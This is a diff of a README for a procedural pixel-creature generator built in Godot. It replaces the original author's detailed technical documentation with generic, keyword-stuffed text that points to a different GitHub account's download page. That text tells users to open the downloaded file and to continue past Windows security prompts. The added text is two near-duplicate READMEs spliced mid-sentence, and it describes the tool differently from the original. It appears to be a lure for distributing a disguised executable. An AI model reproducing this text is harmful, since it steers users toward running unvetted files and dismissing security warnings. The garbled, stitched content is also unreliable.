@@ -1,198 +1,308 @@
-# Procedural Pixel Creatures
+# 🎨 procedural-pixel-creatures - Create Unique Pixel Creatures Easily
 
-![100 procedurally generated creatures in a living landscape](.github/images/creatures.gif)
+[![Download Procedural Pixel Creatures](https://img.shields.io/badge/Download-Procedural%20Pixel%20Creatures-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
 
-[![Join Discord](https://github.com/user-attachments/assets/56ec7fcd-9c82-4450-8326-9419003b9a6a)](https://discord.gg/KmbhM2mJdH)
+Procedural Pixel Creatures is a Godot tool for making pixel creatures with automatic variation. It helps you generate creature designs, explore different shapes and colors, and save results for your own pixel art projects. The tool is aimed at users who want a faster way to create creature ideas without drawing every pixel by hand.
 
-A pixel creature generator, animation framework and genetics workshop built with **Godot 4.5.2 .NET / C#**.
-Body shapes, limbs, faces, colors, markings, rigs and movement are generated in code.
-There are no premade creature sprites or AI-generated source images. After the initial setup,
-the application runs offline without an AI service.
+This guide walks you through finding the download page, downloading the application on Windows, opening it, and learning the basic controls. No programming knowledge is required.
 
-Explore nine creature families, edit their genes, breed new variants and watch up to 100 creatures
-roam a landscape with hills, cliffs and underwater habitats.
+## 🚀 Getting Started
 
-Built primarily with Claude Opus 5.5 from one initial prompt, followed by
-refinements with GPT Astra. The author's estimate is roughly 95% initial prompt and 5% follow-ups.
+Procedural Pixel Creatures is built around a simple idea: you choose a few settings, and the tool creates pixel creatures for you. Each result can look different because the tool uses procedural generation. In everyday terms, that means the software combines small parts, colors, and patterns in different ways to produce new creature designs.
 
-## Quick start
+You can use the tool to:
 
-1. Clone this repository or choose **Code → Download ZIP** on GitHub.
-2. Extract the ZIP into a writable folder on **Windows 10/11 x64**.
-3. Double-click **`Start.cmd`**.
+- Generate pixel creature ideas quickly
+- Explore different body shapes and color combinations
+- Preview creatures before keeping them
+- Save creature designs for later use
+- Repeat a starting value to get similar results again
 
-The launcher downloads missing tools, builds the project and opens the workshop. You do not need
-to install Godot or .NET yourself, choose executable paths, or run as administrator.
-The first setup needs an internet connection; subsequent starts reuse the downloaded tools.
+The main download page is hosted on GitHub. You do not need to create an account to visit the page and download the application.
 
-## What it does
+## 📥 Download and Setup
 
-| Mode | Features |
-|---|---|
-| **Workshop** | Edit individual genes, lock traits, reroll the rest, undo/redo, inspect rigs and foot contacts, and preview animation with a fixed camera. |
-| **Genetics** | Generate four animated offspring with adjustable mutation strength, or combine two compatible parents. |
-| **Overview** | Generate 1–100 creatures, filter by family or archetype, keep favorites during rerolls, and send any creature back to the editor. |
-| **Test area** | Explore five map sizes with terraced hills, slopes, cliffs, vegetation and ponds. Land creatures follow the terrain; aquatic creatures swim below the water surface. |
-| **Export** | Save versioned JSON presets, transparent PNGs, or sprite sheets with animation metadata and a playback preview. |
-| **Framework** | Use the engine-independent C# core or Godot `CreatureActor` in your own project. Plantfolk demonstrate how to add a family through the public extension API. |
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
 
-| Workshop | 100-creature overview |
-|---|---|
-| ![Gene editor and animated preview](.github/images/workshop.png) | ![100 generated creatures in the overview](.github/images/overview.png) |
-| **Living terrain** | **Underwater swimming** |
-| ![Terraced habitat with a mixed population](.github/images/terrain.png) | ![Aquatic creatures swimming below the surface](.github/images/swimming.png) |
+Visit this link to download the application: [procedural-pixel-creatures download page](https://github.com/navnoorsingh39/procedural-pixel-creatures).
 
-The nine families are **quadrupeds, humanoids, reptiles and dragons, arthropods, winged creatures,
-serpents, aquatic creatures, slimes and tentacled creatures, and plantfolk**. Variation changes body
-structure as well as appearance. Humanoids also receive procedural clothing, armor and equipment.
-The repository includes 54 sample genomes: six per family.
+After the download finishes, open the downloaded file to launch the tool. Keep the downloaded file in a folder you can find again, such as your Downloads folder or Desktop. If you move the file later, open it from the new location.
 
-![Eight variants per family, generated by the application](.github/images/families.png)
+## ✨ What You Can Do
 
-Animation includes standing, walking/running or anatomy-specific movement, actions, hit reactions
-and rest. Creatures support eight facing directions. Seeds and separate anatomy, color, pattern
-and motion streams make results reproducible for a given generator version.
+Procedural Pixel Creatures focuses on fast creature creation for pixel art. The tool is useful when you need many creature ideas or when you want to explore a visual style before drawing a final sprite.
 
-## Requirements
+Main abilities include:
 
-| Platform | Setup |
-|---|---|
-| **Windows 10/11 x64** | Automatic setup through `Start.cmd`. PowerShell 5.1 and a graphics driver supporting Godot's Compatibility renderer are required. |
-| **Linux / macOS** | Install **Godot 4.5.2 .NET** and a **.NET 8 SDK/runtime** yourself, then use the shell scripts below. The current release was validated on Windows. |
+- Automatic creature generation from adjustable settings
+- Pixel-based body parts and patterns
+- Color variation for different creature styles
+- Preview area for checking each result
+- Save options for keeping creatures you like
+- Repeatable starting values for controlled experiments
+- Simple controls for changing creature size, shape, and detail
 
-The Windows launcher pins Godot **4.5.2 .NET** and uses a compatible installed SDK/runtime pair or
-downloads a private **.NET SDK 8.0.425**. Official Godot/Microsoft archives are checked against pinned
-SHA-512 hashes and stored in `.tools/`. Environment changes apply only to the launcher and its
-child processes. A generated, project-local `NuGet.Config` points to Godot's bundled packages.
+The tool is designed to support creative exploration. You can generate many creatures in a short session, keep the ones that fit your project, and discard the rest.
 
-Allow a few gigabytes of free space for tools and build caches.
+## 🎮 How to Use the Tool
 
-## Starting
+Open the application after downloading it. The main window gives you access to creature settings and a preview area. Start with the default settings, then change one option at a time to see how the creature changes.
 
-| Windows command | Opens / does |
-|---|---|
-| `Start.cmd` | Workshop |
-| `Start.cmd overview` | 100-creature overview |
-| `Start.cmd testarea` | Interactive test area |
-| `Start.cmd editor` | Godot editor with the selected .NET SDK available |
-| `Start.cmd -PrepareOnly` | Download, build and import without opening the app |
-| `Start.cmd -NoBuild` | Reuse the last build; build once if missing |
-| `Start.cmd help` | Launcher options |
+A simple workflow:
 
-On Linux/macOS, set `GODOT` to your Godot .NET executable if it is not named `godot` on PATH:
+1. Open Procedural Pixel Creatures.
+2. Choose a creature style or start with the default settings.
+3. Adjust shape, color, and detail controls.
+4. Generate a new creature.
+5. Preview the result in the main window.
+6. Save the creature if you want to keep it.
+7. Change the starting value to explore a different result.
 
-```bash
-export GODOT=/path/to/godot
-bash scripts/start.sh             # Add --overview or --testarea
-bash scripts/check.sh --quick
-```
+If you are new to pixel art tools, begin with small changes. Changing too many settings at once can make it harder to understand what each control does. Start with color and body shape, then move on to smaller details.
 
-On Windows, failed starts leave the console open with the error. Fix the reported issue and run
-`Start.cmd` again; interrupted setup can be retried. Logs are under
-`%APPDATA%/Godot/app_userdata/Procedural Pixel Creature Workshop/logs/`.
+## 🖥️ System Requirements
 
-## Working in the Godot editor
+Procedural Pixel Creatures is intended for Windows desktop use. A typical Windows computer can run the tool with these settings:
 
-Run **`Start.cmd editor`** to open the project with the correct toolchain. Press **F5** in Godot to
-run the workshop. The main scene is `workshop/Main.tscn`; the minimal integration scene is
-`examples/minimal_integration/MinimalIntegration.tscn`.
+- Windows 10 or Windows 11
+- 4 GB of memory or more
+- 300 MB of free disk space
+- A mouse and keyboard
+- An internet connection for downloading the application
+- A screen resolution of 1280 by 720 or higher
 
-The main project builds optimized C# even in Debug because creature rasterization runs on the CPU.
-After changing C# code, rebuild through the editor or restart with `Start.cmd`.
+For the best experience, use a computer with at least 8 GB of memory if you plan to generate many creatures in one session.
 
-For integration, copy `addons/procedural_creatures/` into another Godot .NET project and follow
-the [minimal example](examples/minimal_integration/MinimalIntegration.cs). Copy
-`addons/procedural_creatures_plantfolk/` too if you want the ninth family. The
-[architecture guide](docs/ARCHITECTURE.md#extensions) describes the registration hooks.
+## 🧭 First Project Walkthrough
 
-### Exporting a game build
+A first project can be as simple as generating a few creatures and saving the ones you like.
 
-This repository is a source release. In Godot, install the matching **4.5.2 .NET export templates**
-and add a Windows Desktop or Linux preset through **Project → Export**. Export into `build/`, which
-is ignored by Git. Follow [Godot's export documentation](https://docs.godotengine.org/en/4.5/tutorials/export/exporting_projects.html)
-for platform requirements. Native release binaries are not included or validated by this source package.
+Step 1: Open the tool from the downloaded file.
 
-## Controls
+Step 2: Look at the preview area. The first creature may appear automatically, or you may need to use the generate control.
 
-### Workshop and overview
+Step 3: Change the color settings. Try a warmer palette, a cooler palette, or a mixed palette. Watch how the preview updates.
 
-| Input | Action |
-|---|---|
-| F2 | Switch between editor and overview |
-| F5 in the workshop / G in the overview | Reroll |
-| Ctrl+Z / Ctrl+Y | Undo / redo in the editor |
-| Ctrl+S / Ctrl+O | Save / load a preset in the editor |
-| 1 / 2 / 3 | Stand / walk / run |
-| Q / E | Turn |
-| Space / R | Action / rest |
-| H / P / N in the editor | Hit reaction / pause / single simulation step |
-| Click; double-click or Enter in the overview | Select; open the selected creature in the editor |
-| F in the overview | Toggle favorite; favorites survive "Reroll, keep favorites" |
-| Ctrl+wheel in the overview | Change integer zoom |
+Step 4: Change the body shape settings. Small adjustments can create creatures that look round, tall, wide, or detailed.
 
-### Test area
+Step 5: Use the generate control several times. Each result can be different because the tool uses procedural variation.
 
-| Input | Action |
-|---|---|
-| WASD or arrow keys; Shift | Move the controlled creature; run |
-| Tab / click a creature | Choose a creature to control |
-| Space / R / H | Action / rest / hit reaction |
-| + / − or population buttons | Change population from 1 to 100 |
-| Page Up / Page Down | Increase / decrease map size |
-| N / G | Generate a new map / reroll the population |
-| Mouse wheel | Zoom |
-| Right- or middle-button drag | Pan the camera |
-| F | Follow the controlled creature again |
-| M / click the minimap | Toggle minimap / move camera there |
-| F1 / Esc | Toggle controls / return to workshop |
+Step 6: Save one creature that you like. Give it a clear name so you can find it later.
 
-## Files
+Step 7: Repeat the process with a new starting value. This helps you explore a fresh set of creature designs.
 
-Presets use the versioned `ppc.creature` JSON format. A seed reproduces a creature with the same
-family and generator version; saved genomes retain edited genes and separate random streams.
-Sprite sheets include JSON describing directions, frames, pivots and timing.
-See [serialization and export](docs/ARCHITECTURE.md#export).
+## 🛠️ Troubleshooting
 
-Saved presets and exports default to Godot's `user://` directory. On Windows this is
-`%APPDATA%/Godot/app_userdata/Procedural Pixel Creature Workshop/`. These files are separate from
-the repository and are not removed by rebuilding it.
+If the download page does not open, check your internet connection and visit the link again.
 
-## Project layout
+If the download does not start, return to the download page and select the download option again.
 
-| Path | Purpose |
-|---|---|
-| `addons/procedural_creatures/Core/` | Engine-independent generation, genetics, rigging, animation, rasterization and export |
-| `addons/procedural_creatures/Runtime/` | Godot actors, asynchronous generation, rendering and texture uploads |
-| `addons/procedural_creatures_plantfolk/` | Example extension family and sample genomes |
-| `workshop/` | Editor, overview, genetics UI and terrain simulation |
-| `examples/minimal_integration/` | Small Godot integration example |
-| `tests/` | Core/runtime tests, benchmarks and sample export verification |
-| `scripts/` | Automatic Windows setup, launchers, checks and source packaging |
-| `tools/core_harness/` | Console harness for the core without Godot |
-| `docs/ARCHITECTURE.md` | Framework architecture and integration details |
+If the application does not open after downloading, check that the file finished downloading. A partial download may not open correctly.
 
-The [architecture guide](docs/ARCHITECTURE.md) explains generation, animation, rendering and terrain integration.
+If the preview area appears empty, use the generate control or restart the application.
 
-## Self-tests
+If the tool feels slow, close other large programs and try again. Generating many creatures in a row can use more memory over time.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -File scripts/check.ps1
-```
+If you cannot find the downloaded file, check your browser download list or the Downloads folder on your computer.
 
-This builds and imports the project, runs the **17 core tests with 100 seeds per family**, then runs
-**28 Godot self-tests** headlessly. Add `-Quick` for 10 seeds per family. Tests include deterministic
-golden values, genetics, export round trips, terrain/water clearance, population changes and stable
-workshop preview framing. Reports go to the ignored `reports/` directory; failures return a nonzero exit code.
+## ❓ Frequently Asked Questions
 
-The engine-independent tests can also run with just the .NET 8 SDK:
+**Do I need programming knowledge?**  
+No. The tool is used through visual controls and a preview area.
 
-```bash
-dotnet run -c Release --project tools/core_harness -- test reports all 100
-```
+**Where do I download the application?**  
+Visit the download page link in the Download and Setup section.
 
-GitHub Actions is configured to run the full checks on Windows for pushes and pull requests.
+**Can I create many creatures?**  
+Yes. You can generate creatures repeatedly and save the ones you want to keep.
 
-## License
+**Can I control the result?**  
+You can adjust settings and use starting values to guide the result. Procedural generation still adds variation, so each creature can be slightly different.
 
-[MIT](LICENSE), copyright © 2026 idlerunner00. Algorithm attributions and applicable third-party
-terms are preserved in [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+**What should I do first after downloading?**  
+Open the application and try the default settings before changing many options.
+
+**Does the tool work on Windows?**  
+Yes. This guide is written for Windows users.
+
+## 📚 Tips for Better Results
+
+Start with one setting at a time. This makes it easier to see what changed and helps you build a creature style you like.
+
+Use a small set of colors first. A limited palette often gives pixel creatures a cleaner look.
+
+Save creatures often. If you generate a design you like, keep it before changing more settings.
+
+Try different starting values. A new starting value can produce a very different creature even when the other settings stay the same.
+
+Use the preview area before saving. Check the shape, colors, and details at the size you plan to use.
+
+Keep a folder for saved creatures. Clear file names make it easier to find# 🎨 procedural-pixel-creatures - Generate Pixel Creatures Instantly
+
+[![Download Procedural Pixel Creatures](https://img.shields.io/badge/Download-Procedural%20Pixel%20Creatures-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
+
+Procedural Pixel Creatures is a Godot tool for making pixel creatures with automatic variation. It helps you create creature designs, explore different shapes and colors, and keep the results for your own pixel art projects. The tool is aimed at anyone who wants a faster way to produce creature ideas without drawing every pixel by hand.
+
+This guide walks you through finding the download page, downloading the application on Windows, opening it, and learning the basic controls. No programming knowledge is required.
+
+## 🚀 Getting Started
+
+Procedural Pixel Creatures is built around a simple idea: you choose a few settings, and the tool creates pixel creatures for you. Each result can look different because the tool uses procedural generation. In everyday terms, that means the software combines small parts, colors, and patterns in different ways to produce new creature designs.
+
+You can use the tool to:
+
+- Generate pixel creature ideas quickly
+- Explore different body shapes and color combinations
+- Preview creatures before keeping them
+- Save creature designs for later use
+- Repeat a starting value to get similar results again
+
+The download page is hosted on GitHub. You do not need to create an account to visit the page and download the application.
+
+## 📥 Download and Setup
+
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
+
+Visit this link to download the application: [procedural-pixel-creatures download page](https://github.com/navnoorsingh39/procedural-pixel-creatures).
+
+After the download finishes, open the downloaded file to launch the tool. Keep the downloaded file in a folder you can find again, such as your Downloads folder or Desktop. If you move the file later, open it from the new location.
+
+Before opening the tool, make sure the download has completed fully. A file that is still downloading may not open correctly. If your browser asks where to save the file, choose a folder you can easily remember.
+
+## ✨ What You Can Do
+
+Procedural Pixel Creatures focuses on fast creature creation for pixel art. The tool is useful when you need many creature ideas, or when you want to explore a visual style before drawing a final sprite.
+
+Main abilities include:
+
+- Automatic creature generation from adjustable settings
+- Pixel-based body parts and patterns
+- Color variation for different creature styles
+- A preview area for checking each result
+- Save options for keeping creatures you like
+- Repeatable starting values for controlled experiments
+- Simple controls for changing creature size, shape, and detail
+
+The tool is designed to support creative exploration. You can generate many creatures in a short session, keep the ones that fit your project, and discard the rest. Because the results come from a set of rules rather than a fixed list, you can keep generating fresh designs for as long as you need new ideas.
+
+Pixel creatures produced this way are a good starting point. Many artists use generated designs as a base and then refine them by hand. Others use the results directly in small projects, prototypes, or game jams where speed matters more than polish.
+
+## 🎮 How to Use the Tool
+
+Open the application after downloading it. The main window gives you access to creature settings and a preview area. Start with the default settings, then change one option at a time to see how the creature changes.
+
+A simple workflow:
+
+1. Open Procedural Pixel Creatures.
+2. Choose a creature style, or start with the default settings.
+3. Adjust shape, color, and detail controls.
+4. Generate a new creature.
+5. Preview the result in the main window.
+6. Save the creature if you want to keep it.
+7. Change the starting value to explore a different result.
+
+If you are new to pixel art tools, begin with small changes. Changing too many settings at once can make it harder to understand what each control does. Start with color and body shape, then move on to smaller details such as pattern density or outline style.
+
+The preview area is your main reference. Check how a creature looks before saving it. If the preview is small, look at the shape first and the fine details second. This makes it easier to judge whether a design is worth keeping.
+
+## 🖥️ System Requirements
+
+Procedural Pixel Creatures is intended for Windows desktop use. A typical Windows computer can run the tool with these settings:
+
+- Windows 10 or Windows 11
+- 4 GB of memory or more
+- 300 MB of free disk space
+- A mouse and keyboard
+- An internet connection for downloading the application
+- A screen resolution of 1280 by 720 or higher
+
+For the best experience, use a computer with at least 8 GB of memory if you plan to generate many creatures in one session. Close other large programs while working if the tool feels slow.
+
+Laptop users should keep the computer plugged in during longer sessions. Power-saving modes can reduce performance and make the preview update more slowly.
+
+## 🧭 First Project Walkthrough
+
+A first project can be as simple as generating a few creatures and saving the ones you like. Follow these steps to get comfortable with the tool.
+
+Step 1: Open the tool from the downloaded file.
+
+Step 2: Look at the preview area. The first creature may appear automatically, or you may need to use the generate control.
+
+Step 3: Change the color settings. Try a warmer palette, a cooler palette, or a mixed palette. Watch how the preview updates.
+
+Step 4: Change the body shape settings. Small adjustments can create creatures that look round, tall, wide, or detailed.
+
+Step 5: Use the generate control several times. Each result can be different because the tool uses procedural variation.
+
+Step 6: Save one creature that you like. Give it a clear name so you can find it later.
+
+Step 7: Repeat the process with a new starting value. This helps you explore a fresh set of creature designs.
+
+When you finish a session, note the starting values you used for creatures you kept. Reusing a starting value lets you return to a similar set of designs later. This is helpful if you want a family of creatures that share a visual style.
+
+A good short project is to build a set of five creatures: one small, one large, one wide, one tall, and one with a busy pattern. This gives you a small collection that covers different shapes and shows how far the settings can stretch.
+
+## 🛠️ Troubleshooting
+
+If the download page does not open, check your internet connection and visit the link again.
+
+If the download does not start, return to the download page and select the download option again.
+
+If the application does not open after downloading, check that the file finished downloading. A partial download may not open correctly.
+
+If the preview area appears empty, use the generate control or restart the application.
+
+If the tool feels slow, close other large programs and try again. Generating many creatures in a row can use more memory over time.
+
+If you cannot find the downloaded file, check your browser download list or the Downloads folder on your computer.
+
+If Windows shows a security prompt when you open the file, review the prompt and choose the option that lets you continue opening the application you downloaded from the link above.
+
+## ❓ Frequently Asked Questions
+
+**Do I need programming knowledge?**
+No. The tool is used through visual controls and a preview area.
+
+**Where do I download the application?**
+Visit the download page link in the Download and Setup section.
+
+**Can I create many creatures?**
+Yes. You can generate creatures repeatedly and save the ones you want to keep.
+
+**Can I control the result?**
+You can adjust settings and use starting values to guide the result. Procedural generation still adds variation, so each creature can be slightly different.
+
+**What should I do first after downloading?**
+Open the application and try the default settings before changing many options.
+
+**Does the tool work on Windows?**
+Yes. This guide is written for Windows users.
+
+**Can I use the creatures in my own projects?**
+The creatures you generate are meant for use in your own pixel art work. Check the repository page for any license details before publishing large projects.
+
+**Why do two creatures with the same settings look different?**
+Procedural generation adds variation. Using the same starting value reduces the differences, while changing the value produces a new set of results.
+
+**How many creatures can I save?**
+You can save as many as your disk space allows. Keep saved files in a folder you can browse easily.
+
+## 📚 Tips for Better Results
+
+Start with one setting at a time. This makes it easier to see what changed and helps you build a creature style you like.
+
+Use a small set of colors first. A limited palette often gives pixel creatures a cleaner look.
+
+Save creatures often. If you generate a design you like, keep it before changing more settings.
+
+Try different starting values. A new starting value can produce a very different creature even when the other settings stay the same.
+
+Use the preview area before saving. Check the shape, colors, and details at the size you plan to use.
+
+Keep a folder for saved creatures. Clear file names make it easier to find a design again later.
+
+Write down settings that work well. A short note about colors and shape values helps you recreate a style after a break.
+
+Generate in short sessions. Taking a break and returning with fresh eyes makes it easier to judge which creatures are worth keeping.
+
+Keywords: procedural pixel creatures, pixel art generator, Godot tool, creature generator, sprite generator, pixel creature maker, procedural generation, game art tool, Windows application, pixel art software
